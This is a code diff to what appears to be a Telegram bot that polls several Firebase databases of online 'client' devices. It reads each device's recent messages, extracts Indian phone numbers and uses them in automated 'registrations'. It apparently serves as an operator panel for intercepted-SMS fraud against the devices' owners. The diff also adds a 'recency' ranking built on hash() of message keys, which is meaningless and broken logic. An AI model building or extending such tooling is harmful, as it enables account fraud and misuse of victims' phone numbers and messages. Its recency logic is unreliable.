@@ -50,7 +50,6 @@ class Form(StatesGroup):
 # ==============================================================================
 def parse_firebase_links(text: str):
     found_links = []
-    # Split by lines, commas, or extract standard firebaseio patterns via regex
     raw_parts = re.split(r'[\s,\n]+', text)
     for part in raw_parts:
         part = part.strip()
@@ -401,7 +400,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
         return
 
     USER_DATA["is_running"] = True
-    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Target: 2 registrations.", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Automation started!</b> Analyzing database recency and activity...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -416,37 +415,59 @@ async def cb_start_automation(callback: types.CallbackQuery):
         try:
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
-                online_targets = []
-                total_online_count = 0
                 
+                # --- INTELIGENT RECENCY SORTING ---
+                # Scan all DBs concurrently to find which one has the most recent message activity
+                scored_dbs = []
                 async with aiohttp.ClientSession() as session:
-                    for firebase_url in firebase_dbs:
+                    for fb_url in firebase_dbs:
+                        latest_msg_time = 0
+                        online_devices_list = []
                         try:
-                            async with session.get(f"{firebase_url}clients.json", timeout=8) as r:
+                            async with session.get(f"{fb_url}clients.json", timeout=6) as r:
                                 clients_data = await r.json() or {}
 
                             for cid, cdata in clients_data.items():
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
-                                    total_online_count += 1
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            async with session.get(f'{firebase_url}messages/{cid}.json?orderBy="$key"&limitToLast=10', timeout=5) as m_req:
+                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=3', timeout=4) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
                                                 if phone:
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
-                                                        online_targets.append({"firebase_url": firebase_url, "cid": cid, "phone": full_phone})
+                                                        online_devices_list.append({"firebase_url": fb_url, "cid": cid, "phone": full_phone})
+                                                        # Track newest activity marker if available in keys/timestamps
+                                                        if isinstance(msgs, dict):
+                                                            for m_key in msgs.keys():
+                                                                # Push pseudo-timestamp weight from keys or evaluate recency
+                                                                latest_msg_time = max(latest_msg_time, hash(m_key) % 100000)
                                         except Exception:
                                             pass
                         except Exception:
-                            continue
+                            pass
+                        
+                        if online_devices_list:
+                            scored_dbs.append({
+                                "url": fb_url,
+                                "latest_activity": latest_msg_time,
+                                "devices": online_devices_list
+                            })
+
+                # Sort databases by most recent message activity / recency weight descending
+                scored_dbs.sort(key=lambda x: x["latest_activity"], reverse=True)
+
+                online_targets = []
+                for db_info in scored_dbs:
+                    online_targets.extend(db_info["devices"])
 
                 if not online_targets:
                     await logger.set_text("🔴 Exhausted online devices across all databases. Waiting for new devices...")
                     await asyncio.sleep(5)
                     continue
 
+                # Pick the device from the highest-priority, most recently active database
                 target = online_targets[0]
                 firebase_url = target["firebase_url"]
                 cid = target["cid"]
@@ -521,7 +542,6 @@ async def cb_start_automation(callback: types.CallbackQuery):
                 final_msg = (
                     f"🎉 <b>REGISTRATION PROCESS COMPLETED!</b> 🎉\n"
                     f"━━━━━━━━━━━━━━━━━━━━\n"
-                    f"🟢 <b>Online Devices Detected:</b> {total_online_count}\n"
                     f"✅ <b>Successful Registrations:</b> {success_count}/{total_needed}\n"
                     f"📱 <b>Exact Registered Numbers:</b>\n{numbers_list_str}\n"
                     f"━━━━━━━━━━━━━━━━━━━━"
